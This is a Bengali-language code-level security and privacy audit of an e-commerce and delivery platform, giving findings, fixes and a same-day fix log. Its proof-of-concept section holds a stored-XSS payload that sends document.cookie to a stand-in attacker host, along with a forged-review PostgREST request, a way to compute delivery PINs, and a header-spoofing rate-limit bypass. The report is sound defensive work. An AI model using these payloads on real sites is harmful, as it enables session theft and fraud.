# নিরাপত্তা ও গোপনীয়তা অডিট রিপোর্ট — PROSANTI (bhromor)
**তারিখ:** ১৪ অক্টোবর ২০২৬ · **পরিসর:** সম্পূর্ণ কোডবেস (Next.js API routes, Supabase schema/migrations/RLS, Android/Capacitor rider app, client bundles, privacy surfaces)
**পদ্ধতি:** static code review — auth flow, RLS policies, SECURITY DEFINER RPC grants, rate limiting, IDOR/XSS/injection vectors, secret handling, privacy disclosures। লাইভ প্রোডাকশনে কোনো active exploit/test চালানো হয়নি।

---

## সারসংক্ষেপ

| # | গ্যাপ | ধরন | গুরুত্ব |
|---|------|------|---------|
| H1 | JSON-LD `</script>` breakout → stored XSS (vendor-নিয়ন্ত্রিত ফিল্ড) | Security (XSS) | **গুরুতর (Critical)** |
| H2 | Delivery PIN অর্ডার নম্বর থেকেই হিসাব করা যায় (নির্ধারিত/প্রিডিক্টেবল) | Security | **উচ্চ (High)** |
| H3 | Track/access এর ownership proof দুর্বল: অনুমানযোগ্য order no + ফোন | Security/Privacy | **উচ্চ (High)** |
| H4 | Reviews RLS: anon key দিয়ে সরাসরি "approved + verified" রিভিউ বসানো যায় | Security (RLS) | **উচ্চ (High)** |
| H5 | OTP ছাড়া signup → যেকোনো ফোন দাবি করে অতীতের guest অর্ডার হিস্ট্রি পড়া | Privacy | **উচ্চ (High)** |
| M1 | `X-Forwarded-For` এর বাঁদিকের IP বিশ্বাস → rate-limit bypass | Security | মধ্যম (Medium) |
| M2 | Signup ফোন enumeration (409 + timing) | Privacy | মধ্যম |
| M3 | Privacy policy বলে "advertising tracker নেই", কিন্তু Meta Pixel + GA4 বসে (consent ছাড়া) | Privacy/Compliance | মধ্যম |
| M4 | মালিকের ব্যক্তিগত Gmail + গোপন admin URL পাবলিক JS bundle-এ | Privacy/Security | মধ্যম |
| M5 | Android `allowBackup="true"` → session/WebView data বের করা যায় | Security | মধ্যম |
| M6 | দুর্বল পাসওয়ার্ড নীতি, ৩০ দিনের session, revoke/reset সীমিত | Security | মধ্যম |
| L1 | CSP নেই (শুধু frame-ancestors, তাও শুধু Vercel-এ) | Security | নিম্ন-মধ্যম |
| L2 | Direct PostgREST insert policies → spam/junk rows (price/stock watch, shop follow) | Security | নিম্ন |
| L3 | রাইডারের ব্যক্তিগত মোবাইল নম্বর কাস্টমারকে দেখানো হয় | Privacy | নিম্ন |
| L4 | `images.remotePatterns` এ `*.googleusercontent.com` ওয়াইল্ডকার্ড | Security | নিম্ন |
| L5 | Staff-এ MFA নেই (পরিকল্পিত, কিন্তু এখনো নেই) | Security | নিম্ন-মধ্যম |
| L6 | RPC grant হাইজিন: নতুন SECURITY DEFINER ফাংশনে ডিফল্ট grant খোলা থাকে | Security | নিম্ন |
| L7 | রেপো হাইজিন: রুটে ১.৭ MB PNG; Cloudinary cleanup/monitoring নেই | Hygiene | নিম্ন |

**যেগুলো আগেই ভালো করা আছে** (নিচে "যা ভালো আছে" দেখুন) — সেগুলো ভাঙবেন না। ২০২৬-০৯-১৬ ও ২০২০-১০-০৯ অডিটের বেশিরভাগ ফাইন্ডিং ইতিমধ্যে fix হয়েছে; এই রিপোর্টে বাকি থাকা গ্যাপগুলো আছে।

---

> **স্ট্যাটাস (১৪ অক্টোবর ২০২৬, একই দিন):** নিচের সব ফাইন্ডিং fix হয়ে গেছে — বিস্তারিত
> ও ফাইল-তালিকা ডকুমেন্টের শেষের **“Fix log”** অংশে। যেগুলো ইচ্ছাকৃতভাবে কোডে করা হয়নি
> (OTP provider অনুপস্থিত, staff MFA dashboard-কনফিগ, CSP report-only rollout) সেগুলোও সেখানে তালিকাভুক্ত।

## গুরুতর / উচ্চ গ্যাপ — বিস্তারিত

### H1 · Stored XSS: JSON-LD script-এ `</script>` breakout (Critical)

**কোথায়:** `src/components/product/product-page-view.tsx:142`, `src/app/(site)/layout.tsx:124`

```tsx
<script type="application/ld+json"
  dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }} />
```

**সমস্যা:** `JSON.stringify()` `<` ও `>` এস্কেপ করে না। HTML পার্সার script content শেষ করে `</script>` দেখলেই। তাই jsonLd-এর যেকোনো ফিল্ডে `</script><script>…</script>` থাকলে সেটা পেজে সরাসরি JavaScript হিসেবে চলবে। jsonLd-তে `product.name`, `product.shortDescription`, `product.sku`, `shop.name`, `media[].src` — এসব ফিল্ড **vendor নিজেই বদলাতে পারে** (`src/lib/db/vendor.ts` এ `clean()` শুধু trim+slice করে, `<` রাখে)।

**প্রমাণ (PoC):** একজন malicious vendor দোকানের নাম বা প্রোডাক্টের নাম রাখে:
```
</script><script>fetch('https://evil.example/x?t='+document.cookie)</script>
```
সেই প্রোডাক্ট পেজ খুললেই স্টোরফ্রন্ট origin-এ যেকোনো ভিজিটরের ব্রাউজারে স্ক্রিপ্ট চলবে। HttpOnly cookie সরাসরি পড়া যাবে না, তবে XSS দিয়ে same-origin API কল করে লগ-ইন করা কাস্টমারের address book/অর্ডার চুরি, অর্ডার দেওয়া, এবং **admin যদি product preview দেখে → admin-এর Supabase session দিয়ে admin API কল করে বের করা** (full account takeover) সম্ভব।

**প্রতিকার:**
1. JSON-LD ইনজেক্টের আগে `<` এস্কেপ করুন — একটি shared helper:
   ```ts
   const safeJsonLd = (o: unknown) =>
     JSON.stringify(o).replace(/</g, "\\u003c").replace(/>/g, "\\u003e").replace(/&/g, "\\u0026");
   ```
   দুটো `application/ld+json` জায়গাতেই এটি ব্যবহার করুন (product page + root layout)।
2. বিকল্প/সংযোজন: সব user/vendor input যা `dangerouslySetInnerHTML`-এ যায় তার জন্য central sanitize helper; vendor product/shop name-এ `<`, `>` বাদ দেওয়ার validation যোগ করুন (defense in depth)।
3. CSP (নিচে L1) থাকলে এই ক্লাসের XSS-এর প্রভাব অনেক কমবে।

---

### H2 · Delivery PIN প্রিডিক্টেবল (High)

**কোথায়:** `supabase/migrations/202609090007_rider_dispatch.sql` (trigger `ps_set_order_delivery_code`), `supabase/bootstrap-fresh.sql:1572`

```sql
new.delivery_code := lpad((mod(hashtext(coalesce(new.order_no, new.id::text))::bigint, 9000)::int + 1000)::text, 4, '0');
```

**সমস্যা:** `orders` insert-এ code না দিলে trigger টা কোড **হিসাব করে** বসায় — কোনো random নেই। অ্যালগরিদম (`hashtext`) পাবলিক Postgres behavior, এবং order number (`PS-YYYYMMDD-NNNN`) receipt/WA/screenshot-এ ঘুরে বেড়ায়। যেকোনো ব্যক্তি নিজের Postgres-এ `select mod(hashtext('PS-20261014-0042'), 9000) + 1000;` চালিয়ে ডেলিভারি PIN বের করতে পারবে (Supabase-এর সাথে major version মিলিয়ে)।

**ঝুঁকি:** PIN মূলত proof-of-handoff (কাস্টমার রাইডারকে কোড বলে → রাইডার `ps_rider_deliver`-এ দেয়)। কোড অনুমানযোগ্য হলে একজন অসৎ রাইডার কাস্টমারকে না দিয়েই "ডেলিভার্ড" করতে পারে (পণ্য + COD টাকা দুটোই), lockout (৫ চেষ্টা/১৫ মিনিট) কাজে আসে না কারণ চেষ্টা করার দরকারই পড়ে না।

**প্রতিকার:**
1. Trigger-এ সত্যিকারের random code দিন: `lpad((floor(random()*9000)+1000)::int::text, 4, '0')` নয় — `gen_random_bytes`/`gen_random_uuid` থেকে নেওয়া ক্রিপ্টো-র‍্যান্ডম ডিজিট (৪-৬ ডিজিট)। পুরোনো রো-র কোডও একবার rotate করে দিন।
2. `hashtext`-ভিত্তিক derivation সরিয়ে ফেলুন (bootstrap-fresh ও bootstrap-parts সহ সব কপি)।
3. ঐচ্ছিক: ডেলিভারির সময় PIN মিলছে না বলে বারবার ভুল হলে staff-কে alert।

---

### H3 · Track/অ্যাকশন-এর ownership proof দুর্বল (High)

**কোথায়:** `src/app/api/track/route.ts`, `track/cancel`, `track/reschedule`, `track/rate`, `track/push`, `track/rider-location`; `findOwnedOrder` / `findLiveOrder` (`src/lib/db/orders.ts`)

**সমস্যা:**
- Order number `PS-YYYYMMDD-NNNN` — **সহজেই অনুমানযোগ্য** (তারিখ + ৪ ডিজিট ক্রম)।
- একমাত্র ownership proof হলো সেই অর্ডারের ফোন নম্বর — যা প্রায়ই পরিচিত/পাবলিক (সোশ্যাল সার্কেল, ফেসবুক, পাড়ার লোক)।
- এই লুকআপগুলো **in-memory** rate limit (৩০/মিনিট/instance) — durable limit (`checkDurableRateLimit`) এখানে নেই, তাই serverless instance ছড়ালে সীমা বাড়ে; পাশাপাশি XFF spoof (M1) থাকলে সীমাই উড়ে যায়।

**ঝুঁকি:** ফোন + অনুমান করা order no দিয়ে একজন attacker পাবে: কাস্টমারের নাম, ঠিকানা, অর্ডার আইটেম, রাইডারের নাম+নম্বর, **delivery PIN**; পাশাপাশি অর্ডার **বাতিল/রিসিডিউল** করতে পারবে, push subscription যুক্ত করতে পারবে। অর্থাৎ order-no enumeration (প্রতিদিন ~১০⁴ ক্যান্ডিডেট) + জানা ফোন = PII leak + অর্ডারে ব্যাঘাত।

**প্রতিকার:**
1. **Signed track token:** অর্ডার কনফার্মেশনে (receipt/WA/SMS/link) `HMAC-SHA256(secret, order_id + phone + exp)` ভিত্তিক একটি টোকেন দিন; track API টোকেন ছাড়া রিস্পন্ড না করুন (বা টোকেন থাকলে rate limit শিথিল, না থাকলে কড়া)। টোকেন-হীন fallback হিসেবে ফোন+order no রাখলে অন্তত সেটার rate limit **durable** করুন ও attempt log/alert দিন।
2. Track lookup (`track:` key) এবং cancel/reschedule-এ `checkDurableRateLimit` ব্যবহার করুন (login/signup যেভাবে করেছে)।
3. একই IP থেকে টানা ব্যর্থ lookup হলে exponential backoff/ban।
4. Cancel-এর মতো স্টেট-পরিবর্তনকারী কাজে (অন্তত বড় অর্ডার/প্রস্তুত অর্ডার) অতিরিক্ত যাচাই (যেমন অ্যাকাউন্ট থেকে থাকলে session, অথবা ফোনে OTP)।

---

### H4 · Reviews RLS: anon দিয়ে "approved + verified" রিভিউ ইনজেক্ট (High)

**কোথায়:** `supabase/schema.sql:459-460`

```sql
create policy "reviews customer insert" on reviews
  for insert with check (auth.uid() is not null or customer_id is null);
```

**সমস্যা:** `with check` শুধু `customer_id` দেখে — `status`, `verified`, `featured`, `rating`, `author` কোনো কলামই সীমাবদ্ধ নয়। Supabase-এর ডিফল্ট privilege অনুযায়ী anon key-তে table-এ INSERT থাকে, আর RLS অনুমতি দেয় যখন `customer_id is null`। তাই সরাসরি PostgREST কল করলেই যেকোনো ব্যক্তি:

```
POST /rest/v1/reviews
{ "product_id": "...", "author": "X", "rating": 5, "body": "...",
  "status": "approved", "verified": true, "featured": true }
```

— অর্থাৎ **পাবলিক ফেক রিভিউ** (verified badge সহ), shop rating trigger approved রিভিউ গোনে বলে rating-ও manipulate হবে। নিজস্ব `/api/reviews` route-এ moderation আছে, কিন্তু সেটা bypass করা যাচ্ছে।

**প্রতিকার:**
```sql
drop policy "reviews customer insert" on reviews;
create policy "reviews customer insert" on reviews
  for insert to authenticated
  with check (
    customer_id = auth.uid()
    and status = 'pending' and verified = false and featured = false
    and rating between 1 and 5
  );
```
(অথবা সবচেয়ে নিরাপদ: insert policy পুরো তুলে দিন — রিভিউ শুধু service-role route দিয়ে আসুন।) পাশাপাশি বিদ্যমান সন্দেহজনক রিভিউ (`created_at` ছোট ব্যবধান, একই IP/rating pattern) audit করুন।

---

### H5 · OTP ছাড়া signup: যেকোনো ফোন দাবি → অতীতের guest অর্ডার হিস্ট্রি পড়া (High, Privacy)

**কোথায়:** `src/lib/customer-auth.ts` (`signupCustomer`), `src/app/api/account/orders/route.ts`

**সমস্যা:** Signup deliberateভাবে verification-free ("phone + password = account + session")। কিন্তু account খোলার পর `/api/account/orders`, smart card ইত্যাদি সেই **ফোন নম্বরের সব অর্ডার** (guest checkout-এ অতীতে দেওয়া) দেখায়। অর্থাৎ কেউ একটি অব্যবহৃত নম্বর দিয়ে সাইন আপ করলেই ওই নম্বরের আগের মালিক/ভুল টাইপ করা অর্ডারের (নাম, ঠিকানা, আইটেম) হিস্ট্রি পেয়ে যাবে। পাশাপাশি ফোন spoof করে signup = ভবিষ্যতের অর্ডারের নোটিফিকেশন/থ্রেডও।

**প্রতিকার:**
1. **Phone OTP যাচাই** (SMS বা WhatsApp/voice call — বাজেট অনুযায়ী) সাইন আপ ও ফোন পরিবর্তনে বাধ্যতামূলক করুন; যাচাই না হওয়া অ্যাকাউন্টে "unverified" অবস্থা রাখুন এবং unverified অ্যাকাউন্টকে অতীতের guest অর্ডার দেখাবেন না (শুধু নতুন অর্ডার)।
2. OTP না আসলে fallback: অর্ডার হিস্ট্রি শুধু অ্যাকাউন্ট খোলার **পরের** অর্ডার দেখান (পুরোনো guest অর্ডার যুক্ত করতে গেলে সেই অর্ডারের ফোন+order no যাচাই করান, track-এর মতো)।
3. Signup-এ rate limit IP ছাড়াও **ফোন-প্রতি** ক্যাপ (enumeration + OTP bombing প্রতিরোধ)।

---

## মধ্যম গ্যাপ

### M1 · `X-Forwarded-For` এর প্রথম IP বিশ্বাস → rate-limit bypass

**কোথায়:** `src/lib/rate-limit.ts` (`clientIpFromHeaders`): `headers.get("x-forwarded-for")?.split(",")[0]`।

Vercel/বেশিরভাগ প্রক্সি ক্লায়েন্টের পাঠানো XFF-এর **শেষে** সত্যিকারের IP যোগ করে। তাই attacker `X-Forwarded-For: 1.2.3.4` পাঠিয়ে প্রতি রিকোয়েস্টে নতুন IP দেখাতে পারে → login/signup/orders/track সহ সব per-IP সীমা (in-memory + durable key) bypass। `distributed-rate-limit.ts` `x-real-ip` আগে দেখে — দুটো inconsistent।

**প্রতিকার:** trusted hop ধরুন — Vercel-এ `x-real-ip` আগে, নাহলে XFF-এর **সর্ব-ডান** বিশ্বস্ত এন্ট্রি; key-তে IP ছাড়াও ফোন/user id মিলিয়ে bucket বানান (login: `login:${ip}:${phoneHash}`)।

### M2 · Signup ফোন enumeration

`signupCustomer` বিদ্যমান নম্বরে 409 "এই নম্বরে অ্যাকাউন্ট আগেই আছে" দেয়; `loginCustomer`-এ ভুল পাসওয়ার্ডের সময় আলাদা (scrypt চলে না) — timing দিয়েও enumeration।
**প্রতিকার:** signup-এ সবসময় একই রেসপন্স ("সাইন আপ হয়েছে; লগইন করুন" / সমান409), login-এ অজানা নম্বরের জন্যও dummy scrypt চালান (constant-time path)।

### M3 · Privacy policy বনাম বাস্তব ট্র্যাকিং

`src/app/(site)/privacy/page.tsx` বলে *"no advertising trackers, no user id"* — কিন্তু `NEXT_PUBLIC_META_PIXEL_ID`/`NEXT_PUBLIC_GA4_ID` সেট করলে `analytics-scripts.tsx` **Meta Pixel (advertising tracker)** ও GA4 কোনো consent ছাড়াই লোড করে; GA4-তে user-id/ads signals চালু থাকতে পারে। কোনো cookie consent banner/opt-out নেই। বাংলাদেশে কড়া cookie আইন না থাকলেও **প্রাইভেসি পলিসির সাথে অমিল = বিশ্বাস/আইনি ঝুঁকি** (ভবিষ্যতের ডেটা সুরক্ষা আইনের আলোকেও)।

**প্রতিকার:**
1. প্রাইভেসি পেজে স্পষ্ট করুন: কোন ট্র্যাকার (Meta Pixel, GA4), কী ডেটা (ফোন, ঠিকানা, ডিভাইস, order value), কেন, কতদিন রাখা হয়, কীভাবে opt-out করবেন।
2. Consent banner (কমপক্ষে "accept/decline") — decline করলে script না বসানো; GA4-তে Consent Mode v2 সেট করুন।
3. Pixel/GA4-তে অপ্রয়োজনীয় PII (phone, name, order id) পাঠাবেন না — Enhanced Matching বন্ধ রাখুন বা শুধু hashed email।
4. Data retention (GA4 2/14 মাস, Meta) ও third-party দেশে ট্রান্সফারের কথা লিখুন।

### M4 · মালিকের ব্যক্তিগত Gmail + গোপন admin URL পাবলিক JS-এ

`src/lib/admin-auth.ts` ("use client") এ `ADMIN_EMAIL = "rahatbd2050@gmail.com"` ও `ADMIN_LOGIN_PATH = "/admin/ops-gate-7f3a9c"` export করা; `admin-api.ts` স্টোরফ্রন্ট কোড (`use-cms.ts` সহ) থেকে import হয় — অর্থাৎ এগুলো **যেকেনো ভিজিটরের bundle-এ পড়া যায়**। "obscurity layer" তাই কার্যত নেই, আর মালিকের ব্যক্তিগত ইমেইল phishing-এর টার্গেট হয়।

**প্রতিকার:** client bundle থেকে দুটোই সরান — login URL env-driven (`NEXT_PUBLIC_ADMIN_GATE_PATH`) করুন অথবা গেট পেজ সবসময় `/admin`-এ redirect করুন (সবচেয়ে সহজ: লুকানো URL বাদ, MFA/role check-এর উপর নির্ভর করুন); `ADMIN_EMAIL` শুধু server-side রাখুন, লগইন prefill সরান।

### M5 · Android `allowBackup="true"`

`android/app/src/main/AndroidManifest.xml` — হারানো ফোনে/adb backup দিয়ে WebView app data (session cookie, localStorage) বের করা যেতে পারে।
**প্রতিকার:** `android:allowBackup="false"` (বা `fullBackupContent`/`dataExtractionRules` দিয়ে WebView data বাদ); rider KYC ছবি লোকাল থাকলে সেগুলোও বাদ দিন।

### M6 · পাসওয়ার্ড ও session স্বাস্থ্য

- ন্যূনতম ৬ অক্ষর, কোনো strength/কমন-পাসওয়ার্ড চেক নেই (`checkPassword`)।
- Session ৩০ দিন, absolute timeout বা "সব device থেকে logout" নেই; পাসওয়ার্ড বদলালে পুরোনো session invalid হয় না (customer-র জন্য পাসওয়ার্ড চেঞ্জই নেই)।
- Login lockout শুধু IP rate limit — একই অ্যাকাউন্টের উপর distributed (credential stuffing) ধকল নেই।

**প্রতিকার:** ন্যূনতম ৮ অক্ষর + common-password denylist (যেমন `zxcvbn`); login limit key-তে ফোন-প্রতিমাত্রাও (১০/১৫মি); customer password change endpoint + `customer_sessions` revoke; অ্যাকাউন্ট-প্রতি failed-attempt counter।

---

## নিম্ন / হার্ডেনিং

- **L1 · CSP নেই:** `next.config.ts` শুধু `frame-ancestors` (Vercel-এ)। সম্পূর্ণ CSP আগে `Content-Security-Policy-Report-Only` দিয়ে চালু করুন (Cloudinary/OSM/YouTube/inline Next scripts অনুমোদিত তালিকা বানিয়ে), তারপর enforce + nonce/hash। X-XSS-Protection পুরোনো, CSP-ই যথেষ্ট।
- **L2 · Direct PostgREST insert policies:** `price_watches`, `stock_watches`, `shop_follows`-এ `for insert with check (phone ~ '^[0-9]{11}$')` — মন্তব্যেই লেখা আছে "storefront never writes this table directly"। তাই policy মুছে দিন (service-role-ই লিখুক), নাহলে anon সরাসরি হাজার হাজার junk row বসাতে পারবে (API rate limit bypass করে)।
- **L3 · রাইডারের ব্যক্তিগত নম্বর:** track/order response-এ `rider.phone` সরাসরি দেখানো হয়। প্রয়োজন হলে masked করুন (`01712***5678`) বা একটি রিলে/Click-to-call নম্বর দিন; privacy policy-তে রাইডার ডেটা শেয়ারের কথা স্পষ্ট করুন।
- **L4 · Image hosts:** `*.googleusercontent.com` ওয়াইল্ডকার্ড সরিয়ে exact host দিন; `drive.google` টাইপো (`drive.google.com`) — যা হোক Drive hotlink এড়িয়ে চলুন (Cloudinary-ই যথেষ্ট)।
- **L5 · Staff MFA:** `docs/SECURITY-HARDENING.md`-তে পরিকল্পিত — Supabase Auth-এ TOTP MFA বাধ্যতামূলক করুন (admin/super_admin/vendor owner); পাশাপাশি Supabase-এর breach password protection চালু করুন।
- **L6 · RPC grant হাইজিন:** ২০২৬-০৯-১৬ repair ভালো কাজ করেছে (ট্রিগার ফাংশন ছাড়া বিপজ্জনক ফাংশন এখন service-role only)। তবু নতুন ফাংশনে ডিফল্ট grant খোলা থাকে — একটি repeatable চেক চালান:
  ```sql
  select p.proname from pg_proc p join pg_namespace n on n.oid=p.pronamespace
  where n.nspname='public' and p.prosecdef
    and not (select has_function_privilege('anon', p.oid, 'EXECUTE') = false)
    and p.proname not like 'ps_guard%' order by 1;
  ```
  আউটপুটে অপ্রয়োজনীয় নাম থাকলে `revoke all on function … from public, anon, authenticated;` দিন। (এখন যাচাই করা মোটামুটি পরিষ্কার; ঝুঁকি হলো ভবিষ্যতের migration-এ পুনরাবৃত্তি।)
- **L7 · রেপো/অপস:** রুটের `file_00000000b59081fa895b43e61079fe57.png` (১.৭ MB logo) `public/brand/`-এ সরান/সংকুচিত করুন; Cloudinary upload quota alert + cleanup চালু করুন (SECURITY-HARDENING-এ পরিকল্পিত); CI-তে `npm audit --production` step যোগ করুন; Vercel Firewall/Upstash distributed limit **চালু করা কাল** অবস্থায় রাখুন (route-level in-memory limit DDoS প্রতিরোধ নয়)।
- **L8 · Capacitor legacy bridge:** `useLegacyBridge: true` GPS-এর জন্য প্রয়োজনীয় — `allowNavigation` সীমা ঠিক আছে; Capacitor/Capgo advisory নজরে রাখুন এবং WebView-এ `file://`/deeplink খোলা নেই তা যাচাই করে চলুন।
- **L9 · Cookie:** `ps_customer` cookie-তে `__Host-` prefix দিন (Path=/, Secure, no Domain) — session fixation/টাইপস্কোয়ার্ড ডোমেইন ঝুঁকি কমে। State-changing cookie-auth রুটগুলোতে `sec-fetch-site` চেক যেখানে আছে ভালো — সব রুটে (account/orders, threads PUT ইত্যাদি) একই প্যাটার্ন নিশ্চিত করুন।

---

## যা ভালো আছে — ভাঙবেন না

- পাসওয়ার্ড `scrypt` + salt + `timingSafeEqual`; session token DB-তে **SHA-256 hash**; cookie HttpOnly/Secure/SameSite=Lax; login error message uniform (account-probing বন্ধ)।
- Admin API প্রতি রুটে Supabase JWT + `admin_users` role re-check; role rank (`canManageRole`), শেষ super_admin সুরক্ষা; per-staff rate limit + body size cap।
- Rider/vendor IDOR সুরক্ষা (`ps_rider_id()`/`ps_vendor_shop()` চেক), money RPC-তে ভেতরেই `ps_is_admin()`; permission matrix test-এ pin করা।
- ২০২৬-০৯-১৬ repair: memberships RLS, delivery_slots `using(true)` fix, বিপজ্জনক RPC revoke — সঠিকভাবে করা।
- Order pricing/stock/coupon **সার্ভারে** validate হয় (client price বিশ্বাস নয়); CSV export-এ formula-injection defuse (`csvField`); customer/session tables RLS-লকড (service-role only); live-track channel name ৯৬-বিট derived token (গেসযোগ্য নয়); cron secret constant-time compare; health report token/staff-gated; `sw.js` fetch-handler ছাড়া (cache poisoning নেই)।
- Rate limiting ৩-স্তরের (in-memory → durable DB counter → optional Upstash) এবং degrade-এ ইমানদার fallback।

---

## অগ্রাধিকার পরিকল্পনা

**আজ-কাল (৪৮ ঘণ্টা):**
1. H1 JSON-LD `<` এস্কেপ (২ লাইনের fix, সবচেয়ে বড় ঝুঁকি)।
2. H2 delivery PIN random করা (একটি migration)।
3. H4 reviews insert policy লক করা (একটি migration)।

**এই সপ্তাহ:**
4. H3 track token + durable rate limit; M1 IP derivation fix।
5. H5 signup OTP (কমপক্ষে fallback policy: unverified অ্যাকাউন্টে পুরোনো অর্ডার না দেখানো)।
6. M4 থেকে client bundle পরিষ্কার; M5 Android manifest।

**এই মাস:**
7. M3 প্রাইভেসি পলিসি + consent; M6 পাসওয়ার্ড/session hardening; L1 CSP report-only rollout; L5 staff MFA; L2 policy cleanup; L7 monitoring/alerts।

---

*দ্রষ্টব্য: এই অডিট কোড-স্তরে করা। production-এ প্রয়োগের পর উপরের fix গুলো re-verify করুন (বিশেষ করে migration apply হয়েছে কি না — `/api/health` এর `checks` সেকশন দেখুন)।*

---

## Fix log — ১৪ অক্টোবর ২০২৬ (same-day remediation)

সব ফাইন্ডিং একই দিনে fix হয়েছে। নিচে প্রতিটি আইডির প্রতিকার ও ঠিকানা:

| আইডি | প্রতিকার | ফাইল |
|------|---------|------|
| **H1** | JSON-LD `safeJsonLd()` — `</script>`/`<!--`/U+2028 escape (encodeURIComponent) | `src/lib/jsonld.ts` + layout.tsx, product-page-view.tsx |
| **H2** | PIN `ps_random_delivery_code` — `gen_random_bytes` → 1000–9999; non-final অর্ডারে trigger দিয়ে rotate; bootstrap-এও mirror | `supabase/migrations/202610140001_security_hardening.sql`, `supabase/bootstrap-fresh.sql`, `supabase/bootstrap-parts/02_bootstrap-part.sql` |
| **H3** | HMAC-SHA256 signed track token (`t=`, 24 hex, timing-safe verify) — সব track/cancel/rate/reschedule/rider-loc/push রুটে ownership gate; টোকেন ছাড়া strict rate budget; link সব জায়গায় টোকেনসহ | `src/lib/track-token.ts`, `track-gate.ts`, `track-links.ts` + ৬টি `/api/track/*` রুট + checkout/notify/admin-wa/wa-outbox/customer-push + UI hooks |
| **H4** | Reviews insert policy → `authenticated` + `customer_id = auth.uid()` + `pending`/`verified=false`/`featured=false` + rating 1–5; ৩টি anon insert policy drop | `supabase/migrations/202610140001_security_hardening.sql` |
| **H5** | অপ্রমাণিত অ্যাকাউন্ট যেন pre-signup guest অর্ডার না দেখে: `listOrdersForPhone(phone, since=createdAt)`; per-phone rate limit (signup 5/15min, login 10/15min); signup enumeration বন্ধ (M2) | `src/lib/customer-auth.ts`, `src/lib/orders.ts`, `src/lib/db/orders.ts`, `src/app/api/account/orders/route.ts`, `signup/route.ts`, `login/route.ts` |
| **M1** | `clientIpFromHeaders` — সবচেয়ে ডানের (proxied) XFF IP বিশ্বাস | `src/lib/rate-limit.ts` |
| **M2** | Signup সবসময় `202 {ok:true}` + cookie শুধু তৈরিতে; dup-login hint client-side; timing equalized (DUMMY_HASH) | signup/route.ts, `customer-auth.ts`, `account-view.tsx` + tests |
| **M3** | GA4/Meta Pixel consent-gated (`localStorage` key, accept না করলে script লোড হয় না); প্রাইভেসি পলিসিতে tracker + rider-phone sharing ফাঁস | `src/lib/analytics-consent.ts`, `src/components/analytics/analytics-consent-gate.tsx`, `src/app/layout.tsx`, `src/app/(site)/privacy/page.tsx` |
| **M4** | `ADMIN_EMAIL` সম্পূর্ণ বাদ (public bundle থেকে Gmail + prefill দূর); `signOutAdminLazy` (admin-auth lazy, visitor bundle নেই) | `src/lib/admin-auth.ts`, `admin-api.ts`, `src/app/ops-gate/page.tsx` + test |
| **M5** | Android: `allowBackup=false` + `dataExtractionRules` + `fullBackupContent=false` | `android/app/src/main/AndroidManifest.xml`, `res/xml/data_extraction_rules.xml` |
| **M6** | Password policy: signup/change-এ 8+ chars + common-password denylist + pattern ban; login আগের মতো; POST `/api/account/password` (other sessions revoke); customer UI card; per-customer password-change limit | `src/lib/customer-auth.ts`, `src/app/api/account/password/route.ts`, `src/components/account/customer-password-card.tsx`, customer-profile.tsx |
| **L1** | CSP **Report-Only** রোলআউট (`Content-Security-Policy-Report-Only`) + Vercel ছাড়াও `X-Frame-Options` | `next.config.ts` |
| **L2** | price/stock watch + shop follow এর anon insert policy drop (service-role only) | `supabase/migrations/202610140001_security_hardening.sql` |
| **L3** | **Disclosure-only** — privacy policy-তে active delivery-তে রাইডার ফোন দেখানো ও sharing-এর স্পষ্ট ঘোষণা (call-rider ops-এর জন্য রাখা হয়েছে) | `src/app/(site)/privacy/page.tsx` |
| **L4** | `images.remotePatterns` — ৪টি exact host (wildcard বাদ) | `next.config.ts` |
| **L5** | **Docs/ops** — staff-এ Supabase MFA চালু করতে হবে (dashboard config, কোডে নয়) | এই ডকুমেন্ট |
| **L6** | RPC grant audit script (সব SECURITY DEFINER fn-এ PUBLIC revoke verify) | `supabase/checks/rpc-grant-audit.sql` |
| **L7** | ১.৭ MB PNG → `docs/assets/`; CI-তে `npm audit --omit=dev --audit-level=high` | `docs/assets/prosanti-logo-source.png`, `.github/workflows/ci.yml` |
| — | Cookie prefix: production-এ `__Host-ps_customer` (secure+host-only); L9 session naming | `src/lib/customer-auth.ts` |

**Verification:** `tsc --noEmit` clean · `next build` pass · `vitest run` ৫৩৫ files / ৩৬৭২ tests pass · নতুন tests: customer-password-card (3), customer-routes enumeration contract, customer-push token href, admin-api lazy sign-out.

**যা স্পষ্টতই কোডে করা হয়নি (accepted residual):**
1. **Full SMS/email OTP** — provider কনফিগারড নেই; H5 এর সীমাবদ্ধতা (phone claim) তাই ততটুকুই mitigated। প্রয়োজন হলে পরে যোগ হবে।
2. **L5 MFA** — Supabase dashboard-এ যাকে staff-এর জন্য চালু করতে হবে (MFA নীতি), কোডের কাজ নয়।
3. **L1 CSP enforce** — report-only পর্যবেক্ষণের পর `Content-Security-Policy`-তে উন্নীত করুন (ক্রমান্বয়ে)।
4. **Cloudinary monitoring/alerting (L7)** — GitHub Actions cleanup workflow আগে থেকেই আছে; পরিমাণ/ব্যয় alerting অ্যাকাউন্ট-স্তরের কাজ।
5. **Cookie name switch** — production deploy-এ সব মানুষ একবার লগ আউট হবে (`__Host-` prefix)।
